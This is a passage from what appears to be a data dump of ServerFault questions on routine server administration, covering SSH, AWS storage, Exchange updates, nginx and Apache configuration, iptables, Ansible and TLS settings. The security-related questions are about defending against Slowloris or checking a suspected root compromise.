Offending RSA key in /c/Users/Game330/.ssh/known_hosts:1
RSA host key for [wesocular.com]:60504 has changed and you have requested strict    checking.
</code></pre>

<p>What could be the problem ?</p>
","<linux><mysql><php>","2018-02-13 13:15:25"
"828520","AWS S3 EC2 EBS Confusion","<p>Currently when a user uploads a photo / video i upload it in root directory of my website.</p>

<p><code>/var/www/mysite/pics/hash/example_filename.jpg</code>
and 
<code>/var/www/mysite/videos/hash/example_filename.mp4</code></p>

<p>I'm using <code>move_uploaded_file();</code> to store them. </p>

<p>I'm having a confusion on what is difference in storing files in S3 and EFS and  EC2.</p>

<p>Should i store my images/videos uploaded from user in S3 or EFS or EC2 ? </p>
","<php><amazon-ec2><amazon-web-services><amazon-s3><cloud>","2017-01-25 12:19:54"
"828537","HP DL380 G7 fans speed up when i plug GPU","<p>i have a hp proliant dl380 g7 server. </p>

<p>when i plug to pci-e a GPU (Gigabyte gt 610) and power on the server, the fans speed up a lot to make too much noise.
when i unplug the GPU and power on the server, fans (and noise ofc) goes back to normal-quiet.</p>

<p>what should i do to have the GPU plugged-in and the fans go to their normal RPM ?</p>

<p>Thanks</p>
","<hp-proliant>","2017-01-25 14:05:08"
"897234","How to prevent Exchange server from rebooting?","<p>Every now and then our Exchange 2013 server (running on Windows 2008R2) will reboot during office hours, typically in the early afternoon (say, somewhere between 15:00 and 16:00) - apparently because the server thinks it wouldn't hurt anybody because nobody is really logged in. The reboots are always related to the server installing new upgrades automatically and users are annoyed because their Outlook makes problems (if they are lucky, it simply reconnects after a few minutes, but if they were in the middle of composing a longer mail the only way to save their work is by copy-pasting all to an empty Word doc, say, and restart Outlook).</p>

<p>The update settings are as follows:</p>

<ul>
<li>install automatically (recommended)</li>
<li>install daily at 06:00</li>
</ul>

<p>So even if an update process should somehow take a whole hour, the reboot that might be necessary should happen at 07:00 in the morning and not nine to ten hours later, shouldn't it?</p>

<p>I would like to keep the update process as admin-friendly as possible, i.e., without the need to manually install updates off-hours or to manually schedule a reboot.</p>

<p><strong>Q1:</strong> Why can it happen that the automatic reboot (always?) happens so many hours after the scheduled update installation time?</p>

<p><strong>Q2:</strong> Is there any way to gobally prevent automatic reboots during office hours, i.e., to automatically delay an auto-reboot scheduled for between 08:00 and 18:00 to happen at 23:00 instead?</p>
","<windows-server-2008-r2><exchange-2013><automatic-updates>","2018-02-14 15:05:47"
"828653","Run cronjob error Undefined index: REQUEST_URI","<p>I have problems with cronjob &amp; php cli blesta billing, I confused the issue in php/server or there is an error database. I see php <strong>cli</strong> already installed.</p>

<p><strong>Cron Command</strong></p>

<blockquote>
  <p>*/5 * * * * /usr/bin/php /home/domains/member.domain.com/public_html/index.php cron</p>
</blockquote>

<p><strong>Error:</strong> Undefined index: REQUEST_URI</p>

<blockquote>
<pre><code>Unable to deliver 1 invoice to client #31661 via Email due to error: Undefined index: REQUEST_URI
Unable to deliver 1 invoice to client #31331 via Email due to error: Undefined index: REQUEST_URI
Unable to deliver 1 invoice to client #31158 via Email due to error: Undefined index: REQUEST_URI
Unable to deliver 1 invoice to client #31155 via Email due to error: Undefined index: REQUEST_URI
</code></pre>
</blockquote>

<pre><code>The deliver invoices task has completed.
Attempting to run all tasks for Wpfastest.
Attempting to apply credits to open invoices.
There are no invoices to which credits may be applied.
The apply credits task has completed.
Attempting to provision paid pending services.
The paid pending services task has completed.
Attempting to unsuspend paid suspended services.
The unsuspend services task has completed.
Attempting to process service changes.
The process service changes task has completed.
Attempting to process renewing services.
The process renewing services task has completed.
</code></pre>

<hr>

<p><strong>Server Spec:</strong></p>

<p>Php 5.6, 
Apache 2.4, 
Mariadb5.5.</p>

<hr>

<blockquote>
  <p>[root@s3eagle ~]# php /home/mydomain/test-cli.php</p>
  
  <p>Running from CLI[root@superspeed ~]#</p>
</blockquote>

<p><strong>text-cli.php</strong></p>

<pre><code>&lt;?php 
if(php_sapi_name()===""cli"")
  echo(""Running from CLI""); 
else
  echo(""Not Running from CLI""); 
</code></pre>

<hr>

<p><strong>php -v</strong> </p>

<blockquote>
  <p>[root@s3eagle ~]# php -v </p>
  
  <p>PHP 5.6.30 <strong><em>(cli)</em></strong> (built: Jan 20 2017</p>
  
  <p>07:54:54) Copyright (c) 1997-2016 The PHP Group Zend Engine v2.6.0,
  Copyright (c) 1998-2016 Zend Technologies</p>
</blockquote>

<hr>

<p><strong>php -m</strong></p>

<pre><code>    [root@s3eagle ~]# php -m
    [PHP Modules]
ares
bcmath
bz2
calendar
Core
ctype
curl
date
dom
ereg
exif
fileinfo
filter
ftp
gd
gettext
gmp
gnupg
hash
iconv
igbinary
imagick
imap
intl
ionCube Loader
json
ldap
libxml
lzf
mailparse
mbstring
mcrypt
memcache
memcached
mhash
msgpack
mysql
mysqli
mysqlnd
OAuth
odbc
openssl
pcntl
pcre
PDO
pdo_mysql
PDO_ODBC
pdo_sqlite
Phar
posix
pspell
rar
readline
Reflection
session
shmop
SimpleXML
snmp
sockets
SPL
sqlite3
standard
sysvmsg
sysvsem
sysvshm
tcpwrap
tokenizer
uploadprogress
uri_template
uuid
wddx
xml
xmlreader
xmlrpc
xmlwriter
xsl
yaml
Zend OPcache
zip
zlib

[Zend Modules]
Zend OPcache
the ionCube PHP Loader (enabled) + Intrusion Protection from ioncube24.com (unconfigured)
</code></pre>

<p>Maybe somebody got the idea for this. Sorry if untidy.....</p>
","<php><apache-2.4><command-line-interface>","2017-01-25 23:27:46"
"828751","How to force resize windows screen resolution to match that of the Citrix window","<p>When I log into Citrix on two screens, it automatically spans to both. This is annoying as I don't need it that big. So I hit shift-f2 and resize the window, however, the underlying (remote) windows resolution stays the same.</p>

<p>How to force the underlying Windows to adjust to new size of ctrix screen?</p>
","<citrix>","2017-01-26 13:01:13"
"828800","How do I get the name of the host (based on ip)?","<p>I am not going to disclose the public IP address here , but is there a way on to get the name of the hosting PC / Server .
Thanks</p>
","<ip><hostname>","2017-01-26 16:16:58"
"828835","How to administer VMware ESXi from Linux?","<p>I am experimenting with VMware's virtualization solution ESXi.
I got no problem installing the hypervisor, but now I wonder how to administer this thing.</p>

<p>As far as I found in the manuals there is the vSphere Client to do this job. But this client is not supported for Linux.</p>

<p>ESXi comes with a Web Client but only with version 6.x. With my old hardware I am only able to install a 5.1, so that's no solution as well.</p>

<p>I read about the vCenter. If I understand correctly this is an full-server image, so I need another machine for this? And to run it on a virtual machine inside ESXi does not work either, because I cannot create VMs.</p>

<hr>

<p>Now I wonder if there is any way to administer VMware with a Linux computer?
I get the feeling VMware is not very Linux-friendly but only targets SysAdmins using Windows.</p>
","<vmware-esxi>","2017-01-26 19:07:59"
"897511","Nginx + php7.1-fpm, upstream timed out (110: Connection timed out) while reading response header from upstream","<p>I have installed Nginx and php7.1-fpm on Ubuntu 16.04. It was working perfectly fine. I am started getting <code>504 Gateway Time-out</code> error. </p>

<p>When I checked the Nginx log, I got this errors:</p>

<pre><code> *1 upstream timed out (110: Connection timed out) while reading response header from upstream, client: xxx.xxx.xxx.xxx, server: server.name,, request: ""GET / HTTP/1.1"", upstream: ""fastcgi://unix:/run/php/php7.1-fpm.sock"", host: ""example.com"", referrer: ""http://example.com/""
</code></pre>

<p>Here is my virtual host file</p>

<pre><code>server {

    listen 80 default_server;
        listen [::]:80 default_server;

    server_name example.com;

    root /var/www/example/public;

        index index.html index.htm index.nginx-debian.html index.php;

        location / {

                 try_files $uri $uri/ /index.php?$query_string;

        }

    location ~ \.php$ {
            try_files $uri /index.php =404;
                fastcgi_split_path_info ^(.+\.php)(/.+)$;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                fastcgi_pass unix:/var/run/php/php7.1-fpm.sock;
                include fastcgi_params;
        }


    location ~ /\.ht {
                deny all;
        }
}
</code></pre>

<p>Please guide why I am getting this error. How can I resolve it.</p>
","<ubuntu><nginx><ubuntu-16.04>","2018-02-16 08:13:25"
"829004","iptables - how to make firefox think internet is un-plugged?","<p>if I disconnect my internet and try to<br>
lunch firefox..</p>

<p>in just 1 second firefox will stop <br>
trying to reach the internet and say<br>
internet can not be reached.</p>

<p>okay.. now.. how can I do this same thing<br>
with firefox</p>

<p>via iptables ?</p>

<p>in other words I will be connected to the
internet.</p>

<p>i want to launch firefox.</p>

<p>but iptables rules need to block all internet<br>
and firefox needs to stop immediately<br>
and say internet can not be reached.</p>

<p>currently.. with these iptables rules..</p>

<p>firefox will try to reach the internet<br>
for about 10-20 seconds..<br>
before it gives up and stops trying.</p>

<pre><code>cat /etc/sysconfig/iptables

*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT DROP [0:0]
-A INPUT -m state --state RELATED,ESTABLISHED -j DROP
-A INPUT -j DROP
-A OUTPUT -j DROP
COMMIT
</code></pre>
","<networking><centos><iptables>","2017-01-27 14:51:07"
"897745","Dns nx domain in cmd but page loads in browser","<p>When running nslookup google.com in cmd on my corporate laptop I get nxdomain but how come does the page open then in my web browser? Can anyone please explain? Thank you.</p>
","<nslookup>","2018-02-18 09:14:44"
"897912","Is Mirantis OpenStack free","<p>I have been looking onto Mirantis website and others but could not figure out if Mirantis OpenStack is free to use or not.</p>

<p>There are many links of web including this one <a href=""https://ask.openstack.org/en/question/91456/mirantis-openstack-with-ha-includes-cost/"" rel=""nofollow noreferrer"">https://ask.openstack.org/en/question/91456/mirantis-openstack-with-ha-includes-cost/</a> which says that you only pay for support and software for Mirantis OpenStack is free but answer was not accepted, can someone please confirm if it is really free to use for production? and I can get this from here: <a href=""https://www.mirantis.com/software/openstack/download/"" rel=""nofollow noreferrer"">https://www.mirantis.com/software/openstack/download/</a></p>
","<cloud><openstack>","2018-02-19 20:27:28"
"829176","What is a SSATA port?","<p>I bought an <a href=""https://www.asus.com/us/Commercial-Servers-Workstations/Z10PED16/HelpDesk_Manual/"" rel=""noreferrer"">ASUS ZPE10-D16</a> motherboard for a server I'm building.  The manual describes two banks of SATA ports; a group of four it calls SSATA, instead of just SATA ports.  I'm wondering if there's any difference between the SSATA ports and the SATA ports.  The manual offers no explanation.  How are these ports different than the group of six?</p>
","<sata><asus>","2017-01-28 18:52:37"
"897966","Some domains receive my emails, others aren't sent","<p>I finally made it to set up my mail-server with exchange.</p>

<p>Receiving e-mails works perfectly, sending e-mails works not always:</p>

<p>When sending an e-mail to GMX, the e-mail doesn't get delivered. After a while I get following response (I guess from my own mail-server):</p>

<blockquote>
  <p>Die Zustellung an folgende Empfänger oder Gruppen verzögert sich:
  <em>Vorname Nachname (vorname-nachname@gmx.de)</em>
  Betreff: Re: Test
  Diese Nachricht wurde noch nicht zugestellt. Es wird weiterhin versucht, die Nachricht zuzustellen.
  Der Server wird noch 1 Tage, 19 Stunden und 50 Minuten versuchen, die Nachricht zuzustellen. Sie erhalten eine Benachrichtigung, falls die Nachricht bis dahin nicht übermittelt werden konnte.</p>
</blockquote>

<p>means something like </p>

<blockquote>
  <p>the delivery to following recipients or groups is delayed: [...] This message wasn't delivered yet. It is still trying to deliver the message. The server will try to deliver the message for another 1 day, 19 hours and 50 minutes. You will receive a notification if the message could not be delivered by then.</p>
</blockquote>

<p>Yesterday I tried to send a mail to some microsoft-mail (hotmail.com, outlook.com,...) I instantly got the message that I can't send mails to them. Today it worked (but I found the mail then in my spam-folder).</p>

<p>Mails to gmail aren't delivered and I don't get any error-mail.</p>

<p>Any idea what the problem could be? 
I didn't add a certificate for now to my exchange, could this be the problem?</p>
","<exchange-2016>","2018-02-20 08:29:39"
"829218","View internal server's website through main web server","<p>So this one is a little hard for me to explain,</p>

<p>I have two servers, hypothetically named Orion, and the other is Behemoth. Orion is my web server and Behemoth is my VM host. Orion's web server is hosted on ports 80 and 443, and Behemoth's control panel is on port 8006. Is it possible to set up a page on Orion to act as a gateway into Behemoth's page (i.e. using iframes in html or something more technical)? I have a couple of VMs that would require similar setup, but I am mostly concerned about Behemoth's panel.</p>

<p>Orion is running Ubuntu with an Apache web server. Behemoth is running Proxmox 4.4</p>

<p>P.S: I am a cyber student who uses VMs at a school that has extremely strict firewall rules that doesn't allow ports other than 80 and 443, so just using my domain name and port forwarding wouldn't quite solve the problem.</p>

<p>Thanks!</p>
","<linux><web-server><apache2>","2017-01-29 04:28:23"
"898089","Cannot grant server roles to self using local DB SQL Server","<p>I am not the admin on my work machine. I had SQL Server 2012 installed and I cannot create or import a DB. Under security I tried granting my windows UN 'dbcreator' and do not have permission. I log into my local server using my machine name. </p>
","<sql-server><sql-server-2012>","2018-02-20 19:44:13"
"829287","When logging in remotely, can the laptop you use be traced?","<p>If you were to log in to your company's network using a remote connection but used another employee's login details, not your own, would the administrator be able to trace which laptop was used?</p>
","<security><remote-desktop><remote-access><anonymous>","2017-01-29 17:11:30"
"829294","mimic kernel's response to a program that network is not connected?","<p>First let's block all incoming / outgoing traffic.</p>

<blockquote>
  <p>vi /etc/sysconfig/iptables</p>
</blockquote>

<pre><code>*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A OUTPUT -j DROP
-A INPUT -j DROP
-A FORWARD -j DROP
COMMIT
</code></pre>

<p>Next: let's test <strong>ping</strong></p>

<pre><code>ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
</code></pre>

<p>at that point ping <strong>stalls</strong>.. perhaps will wait until times out. </p>

<p>Now let's disconnect the network interface and try again:</p>

<pre><code>ping 8.8.8.8
connect: Network is unreachable
</code></pre>

<p>beautiful, it stopped instantly. ( no stalling or waiting for time out )</p>

<p>Some recommended using ""<strong>REJECT</strong>"" in the iptables-rules<br>
and even play with the <strong>-j REJECT --reject-with</strong> flags..</p>

<p>I have tried them all.<br>
there is no way to send the <strong>same signal the kernel<br>
is sending</strong> to the program when the <strong>network interface is disconnected</strong>.<br>
( via iptables )</p>

<p>This is what I want to do for now:</p>

<blockquote>
  <p>figure a way to ensure <strong>Kernel</strong> tells <strong>ping</strong> that <strong>network is
  disconnected</strong>. <br>
  ( or run a command in another terminal manually to send such a signal )</p>
</blockquote>

<p>this way ping will not stall. it will simply say</p>

<pre><code>connect: Network is unreachable
</code></pre>

<p>and stop.</p>

<p>Can it be done &amp; how ?</p>
","<networking><iptables><command-line-interface><kernel>","2017-01-29 17:54:15"
"898147","Copy/paste disabled after running remote desktop in windows7","<p>I have 64bit windows 7. When I run remote desktop to another server or computer, copy/paste disabled on whole of my PC!
I enabled copy/paste option on remote desktop, but it is not working.
I can not copy/paste between remote machine and my PC and I can not copy/paste anything in my PC.
When I disconnect from remote desktop, everything would be OK.
How to solve this problem?</p>
","<remote-desktop><rdp><remote-desktop-services><copy>","2018-02-21 06:50:44"
"898261","Ansible Extract and Sum","<p>I have a list of items (zip files) to where I am performing a match against specific characters, then extracting those filenames to create a new list. </p>

<p>With the new list, I'm performing an unzip -l on each item to count all of the files within the zip, and I'd like to sum the total results. I'm not sure how to perform the sum because there are multiple stdout indexes within the registered variable. </p>

<p>I'm not a developer and I'm sure there is probably a more efficient way of doing this, but this is where I've arrived based on my knowledge. </p>

<p><strong>Original List</strong></p>

<pre><code>vars:
  - patches: [

      PB.nfm.21.sp1.551.pb2017091516976,
      PB.ps.21.sp1.551.pb2017091591424,
      PB.ns.21.sp1.551.pb2017091854308,
      PB.ums.21.sp1.551.pb2017091828149,
      PB.ps.21.sp1.551.pb2017091592773,
      PB.as.21.sp1.551.pb2017091555706,
      PB.as.21.sp1.551.pb2017091555707,
      PB.xsp.21.sp1.551.pb2017091891314 ]
</code></pre>

<p><strong>Ansible Role (Extracting items containing 'PB.as')</strong></p>

<pre><code>- name: Count all files in all PB archives
  register: patch_total
  delegate_to: localhost
  shell: ""/usr/bin/unzip -l bw/patches/{{ item }}.Linux-x86_64.zip | awk '{count = $2} END{print count}'""
   with_items: ""{{ patches|select('match','PB.as.')|list }}""
- debug: var=patch_total.results
</code></pre>

<p><strong>Debug Results (how do I sum the stdout for both items?)</strong></p>

<pre><code>""patch_total.results"": [
        {
            ""_ansible_delegated_vars"": {
                ""ansible_delegated_host"": ""localhost"",
                ""ansible_host"": ""localhost""
            },
            ""_ansible_ignore_errors"": null,
            ""_ansible_item_result"": true,
            ""_ansible_no_log"": false,
            ""_ansible_parsed"": true,
            ""changed"": true,
            ""cmd"": ""/usr/bin/unzip -l bw/patches/PB.as.21.sp1.551.pb2017091555706.Linux-x86_64.zip | awk '{count = $2} END{print count}'"",
            ""delta"": ""0:00:00.006809"",
            ""end"": ""2018-02-21 13:53:08.438719"",
            ""failed"": false,
            ""invocation"": {
                ""module_args"": {
                    ""_raw_params"": ""/usr/bin/unzip -l bw/patches/PB.as.21.sp1.551.pb2017091555706.Linux-x86_64.zip | awk '{count = $2} END{print count}'"",
                    ""_uses_shell"": true,
                    ""chdir"": null,
                    ""creates"": null,
                    ""executable"": null,
                    ""removes"": null,
                    ""stdin"": null,
                    ""warn"": true
                }
            },
            ""item"": ""PB.as.21.sp1.551.pb2017091555706"",
            ""rc"": 0,
            ""start"": ""2018-02-21 13:53:08.431910"",
            ""stderr"": """",
            ""stderr_lines"": [],
            ""stdout"": ""231"",
            ""stdout_lines"": [
                ""231""
            ]
        },
        {
            ""_ansible_delegated_vars"": {
                ""ansible_delegated_host"": ""localhost"",
                ""ansible_host"": ""localhost""
            },
            ""_ansible_ignore_errors"": null,
            ""_ansible_item_result"": true,
            ""_ansible_no_log"": false,
            ""_ansible_parsed"": true,
            ""changed"": true,
            ""cmd"": ""/usr/bin/unzip -l bw/patches/PB.as.21.sp1.551.pb2017091555707.Linux-x86_64.zip | awk '{count = $2} END{print count}'"",
            ""delta"": ""0:00:00.005809"",
            ""end"": ""2018-02-21 13:53:08.577996"",
            ""failed"": false,
            ""invocation"": {
                ""module_args"": {
                    ""_raw_params"": ""/usr/bin/unzip -l bw/patches/PB.as.21.sp1.551.pb2017091555707.Linux-x86_64.zip | awk '{count = $2} END{print count}'"",
                    ""_uses_shell"": true,
                    ""chdir"": null,
                    ""creates"": null,
                    ""executable"": null,
                    ""removes"": null,
                    ""stdin"": null,
                    ""warn"": true
                }
            },
            ""item"": ""PB.as.21.sp1.551.pb2017091555707"",
            ""rc"": 0,
            ""start"": ""2018-02-21 13:53:08.572187"",
            ""stderr"": """",
            ""stderr_lines"": [],
            ""stdout"": ""231"",
            ""stdout_lines"": [
                ""231""
            ]
        }
    ]
}
</code></pre>
","<ansible>","2018-02-21 19:03:17"
"898335","Amazon S3 Console: How to find total number of files with in a folder?","<p>So I can see S3 console and can get into my folder with files listing but I don't find way to find total number of files in it other than going thru pagination which does not work considering thousands of files.</p>
","<amazon-web-services><amazon-s3>","2018-02-22 07:40:49"
"898391","Where can I find login/password information for connecting to local openSSH server started in Windows 7?","<p>I opened passwd file in etc directory but didn't find something useful. While installing openSSH I set password but for all usernames I input this pass I got ""access denied"". As SSH client I'm using PuttY.Where can I find right log/pass?</p>
","<windows><ssh><windows-7><putty>","2018-02-22 12:18:31"
"898648","How to add a header in .htaccess bases on filetype (mime type)?","<p>I would like to add two extra HTTP headers to all responses that are of filetype (mime type) text/html, but not other files.</p>

<p>The current headers (edited):</p>

<pre><code>curl -I https://www......

HTTP/1.1 200 OK
Date: Fri, 23 Feb 2018 20:43:15 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache
Vary: Content-Type,Accept-Encoding
X-Frame-Options: SAMEORIGIN
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Content-Language: de-DE
</code></pre>

<p>The <code>&lt;If&gt;</code> statement I tried is not working (my idea was to check for <code>text/html</code>, and if that is set, then also add two extra headers with <code>Header set</code>.</p>

<p>I have checked multiple sources like <a href=""https://httpd.apache.org/docs/2.4/expr.html#examples"" rel=""nofollow noreferrer"">here on apache.org</a>, but cannot seem to find the answer.</p>

<p>This is one of the things I've tried that seems most logical to me. Do a check for a current header; if result is true then add extra headers.</p>

<pre><code>&lt;If ""%{HTTP:Content-Type} in { 'text/html' }""&gt;
Header set Header1 test
Header set Header2 test
&lt;/If&gt;
</code></pre>

<p>But I do not know if this ENV is taken from the request or response header.</p>

<p>Does anyone know of a way to achieve this -- add custom HTTP header in the response based on mime type?</p>

<p>Thanks.</p>
","<apache-2.4><.htaccess><centos7><http-headers>","2018-02-23 21:19:55"
"898796","htaccess redirecting to url.php","<p>I wanted the following url <code>www.example.com/userprofile.php?username=username</code>
To <code>www.example.com/username</code>
<br>
Below is my htaccess file</p>

<pre><code>Options All -Indexes
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^([^\.]+)$ $1.php [NC,L]
RewriteRule ^([^\.]+)$ $1index [NC,L]
RewriteRule ^([^\.]+)$ $1login [NC,L]
RewriteRule ^(.*)$ userprofile.php?username=$1 [QSA]
</code></pre>

<p>When i type <code>www.example.com/username</code> the GET username is echoed as 

<pre><code>username.php
</code></pre>

<p>I've tried everything but can't get a solution <br>
Any help is appreciated </p>
","<.htaccess><mod-rewrite>","2018-02-25 17:58:33"
"899108","What `+` and `-` means in background jobs output","<p>When I run a bunch of background jobs with </p>

<pre><code>for s in {1,2,3}; do command_$s &amp;; done;
</code></pre>

<p>I can see all of them with the <code>jobs</code> command</p>

<pre><code>$ jobs
[2]    running    command_1
[3]  - running    command_2
[4]  + running    command_3
</code></pre>

<p>I know that the first column is the ID (I can for example <code>kill -9 %2</code> to kill <code>command_</code>)</p>

<p>But what does <code>+</code>, <code>-</code> and lack of any of those means? Running <code>man jobs</code> and <code>jobs -h</code> does not work. </p>
","<background-process>","2018-02-27 13:16:55"
"899197","What connection does RDP default to when host machine is on wifi and ethernet?","<p>When the host machine I'm connecting to is currently on both the docked (ethernet) and wireless version of our network, which one does RDP default to when I initiate Remote Assistance? </p>
","<wifi><rdp><ethernet>","2018-02-27 20:38:46"
"899535","When using tcpdump's `-i any` argument, how to get also interface name inline?","<p>I'm diagnosing some networking issues with an inordinate amount of network interfaces on a Linux server. </p>

<p>I'm needing to dump all interface traffic as per <code>tcpdump -i any</code>, but I'm not finding any definition of the interface identifier (eth0, eth10, br4, etc.) </p>

<p>Is there a way to instruct <code>tcpdump</code> to include interface info with each packet per line?</p>
","<linux><linux-networking><tcpdump>","2018-03-01 18:59:37"
"899545","Servlet hosting with peak capacity","<p>I am hosting a <a href=""http://www.whereisroadster.com"" rel=""nofollow noreferrer"">website</a> that is currently run on Google Cloud Storage, and a completely static interface. I am considering upgrading it to allow for better plotting tools, which will require it to run a server, in this case a Java Servlet. The specific technology is Webmathematica, if it matters. My website hast mostly a steady demand averaging around 1K visitors at a time, but has had a peak of over 40K. My hunch is that a single server would not be enough to host such a service, that it would crash. Right now being hosted with a purely static website, I have been okay, but I'm worried about what might happen if I switch to a servlet system and I receive another huge spike in traffic.</p>

<p>What I would like to know is if there is a system in place that will allow me to host my website with java servlets that will scale as required. I would rather not pay for the high demand load all of the time, but I would like the option to turn on a few extra servers if the spare capacity should be required. I think I am okay if the site goes down for a minute while the servers turn on, but not much longer then that.</p>

<p>Is there such a host? What exactly is the name of this capacity so I can price things out? And is there anything else that I should know?</p>
","<hosting><scalability><servlet>","2018-03-01 19:49:55"
"899599","Recently Created Subdomains Not Working","<p>Why is the subdomains not working? I created from CPanel. Can anyone helped?</p>

<pre><code>support.sevena.com.my’s server IP address could not be found.
ERR_NAME_NOT_RESOLVED
</code></pre>
","<subdomain>","2018-03-02 02:39:09"
"899868","Trying to understand something","<p>So I'm trying to figure something out, if I receive UDP traffic to my server from another server I can't really block it, like the iptables it's just blocking the traffic to being processed, but I want to stop it reaching the interface, is there any method that you can stop an IP sending traffic to a server like not receiving it?</p>
","<linux><networking><ddos><traffic-management><traffic-filtering>","2018-03-04 07:32:50"
"900057","How to mirror commands across servers","<p>I have three CentOS servers in the Azure environment that needs a bunch of software and configuration done to them (i.e. adding users, adding permissions, etc.) Unfortunately I can't just do it to one server and replicate the servers. Does there exist a way where I can do this to one server and it replicates across the other two so I only have to do this once?</p>
","<centos><azure>","2018-03-05 15:47:08"
"900096","Should I remove the ipv6 of my server from trusted IPs of fail2ban v0.9?","<p>I have new Plesk Onyx server with CentOS 7. I installed the Fail2ban component (the version installed is v0.9.6).</p>

<p>In the fail2ban.log I see a lot of warnings like this:</p>

<p><code>WARNING Unable to find a corresponding IP address for xxxx:xxxx:x:xxxx::: [Errno -9] Address family for hostname not supported</code></p>

<p>The ipv6 is the one of my server and I noticed that is in the trusted IPs list. I know that fail2ban v0.9 does not support ipv6.</p>

<p>Should I remove the ipv6 of my server from the trusted IP addresses to avoid these warnings? Thanks for your help!</p>
","<ipv6><fail2ban>","2018-03-05 18:12:03"
"900509","How much bandwidth does a Debian server consume when it's idle?","<p>How much bandwidth as network in/network out would an idle Debian server consume? I assume that a cloud service would compute as traffic port scannings, people trying to log in with default passwords and the like.</p>
","<debian><traffic-management>","2018-03-07 18:26:42"
"900532","How can I protect against Slowloris on a NGINX server?","<p>Well, I recently discovered that my site(s) were vunerable to the Slowloris attack.</p>

<p>A few seconds in after testing the attack on my server just to verify it was Slowloris that was causing the issue, it instantly started having connection issues. How would I protect against this on an nginx server?</p>
","<nginx><ddos><denial-of-service>","2018-03-07 20:20:23"
"954011","HTTPS security warning for sub subdomains","<p>I have an apache 2 server and I a wildcard https certificate for all my subdomains. But I do not have one for sub subdomains. </p>

<p>Here's an example:</p>

<pre><code>https://example.com = secure
https://wildcardsubdomain.example.com = secure
https://www.wildcardsubdomain.example.com = warning unsecure
</code></pre>

<p>I am trying to do a mod_rewrite to get rid of any trailing wwws.</p>

<pre><code>RewriteEngine On
RewriteCond %{HTTP_HOST} ^www\.(.+) [NC]
RewriteRule ^ https://%1%{REQUEST_URI} [L,R=301]
</code></pre>

<p>But I found out I cannot rewrite before the security check. How can I overcome this issue and move from the www. to the non www.?</p>
","<apache-2.2><https><mod-rewrite>","2019-02-14 21:39:16"
"900536","how to migrate wordpress blog website to a node based application?","<p>I had an already existing blog written in wordpress, which uses db for storing the posts. Now, I am removing the wordpress and writing my node application that just serves the page requested by the user. The problem I am facing is how do I convert the db to a page. Next, I am looking for any other option i.e. using the db and displaying it on the node application. Is there any easy option to do so?</p>
","<wordpress><node.js>","2018-03-07 20:46:12"
"900592","How to disable TLS v1.1 in Nginx","<p>It seems to be a straightforward configuration setting, but I cannot disable TLSv1.1.</p>

<p><strong>nginx.conf</strong> in /etc/nginx:</p>

<blockquote>
  <p>ssl_protocols TLSv1.2;</p>
</blockquote>

<p><strong>Domain configuration</strong> last_nginx.conf (changed via Plesk templates in nginxDomainVirtualHost.php):</p>

<pre><code>ssl_protocols                TLSv1.2;    
ssl_ciphers                 ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA;

ssl_prefer_server_ciphers   on;
ssl_dhparam /etc/nginx/ssl/server.dh_pem;
</code></pre>

<p>Still the TLSv1.1 is enabled and, when tested with openssl returns this:</p>

<pre><code>openssl s_client -tls1_1 -connect mydomain.com:443 &lt; /dev/null

    New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1.1
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: E298E87276A0776AF736439AF260FE0F92B17330ED97D5F3C2F87CF02C3F75A8
</code></pre>

<p>What am I missing here? Why is TLSv1.1 still enabled though only TLSv1.2 was specified?</p>

<p>Any suggestions how to disable TLSv1.1?</p>

<p>Thanks!</p>
","<nginx><ssl><cipher>","2018-03-08 06:19:22"
"900694","root password found changed. Did someone break into my server?","<p>This morning I found myself unable to log into the root account on one of my (CentOS 6) servers. I booted into single user mode and reset the root password. Everything seems to be working normally now. </p>

<p>I have a number of monitoring metrics that watch behavior on this server and have seen no evidence of nefarious activity. However, I am not sure I can trust the security of this server without doing a full OS reinstall.</p>

<ul>
<li>What steps can I take to diagnose the cause of this? </li>
<li>In theory someone may have had root access to my machine. Is there any way I can rule this possibility out?</li>
</ul>
","<centos><security><centos6>","2018-03-08 16:57:33"
"900989","How To make computer joined AD to have a different wallpaper from the rest","<p>All of my server are joined AD (Windows Server 2012) but i want every server wallpaper to be different from other, because i have put GPO for all user to have same desktop, every time login it has same wallpaper.</p>

<p>so i want server to have different wallpaper even though the login is AD login</p>

<p>Are there any way to change the wallpaper on server to have it's own wallpaper, so whatever the login is the wallpaper is always it, not changed because GPO user policy </p>

<p>Because the GPO on computer (not user policy) not having desktop menu like user policy, and please do not say the server to not join domain </p>
","<active-directory><windows-server-2012><group-policy>","2018-03-10 11:05:06"
"901018","Difference between DNS Reslover and Recursor?","<p>What is the difference between DNS resolver and DNS recursor? </p>

<p>What are their core responsibilities?</p>

<p>Why ""A DNS recursor is a resolver but a DNS reslover is not a DNS recursor?</p>
","<domain-name-system>","2018-03-10 18:13:28"
"901091","reboot/restart a remote linux vps when its down by programming","<p>Server Type - VPS</p>

<p>OS - Centos</p>

<p>Panel - cpanel</p>

<p>Root access -  Yes i have.</p>

<p>Sometime due to load or some other issues my vps goes down. Then i always need to perform a restart by login at my host's server control panel.</p>

<p>When i click on restart tab after few minutes my server come back online.</p>

<p>But i want to do that pragmatically or with some kind of script.</p>

<p>I can detect when my server gets down. I have my own server monitoring system but its not possible for me to be available online every time when my server goes down. So i bear loss at that time.</p>

<p>That is why i am looking for making a script by which i can remotely send a reboot/restart request automatically to my down VPS. Same way like my host's server control panel does.</p>

<p>But i am not getting any clue about how to do that?</p>

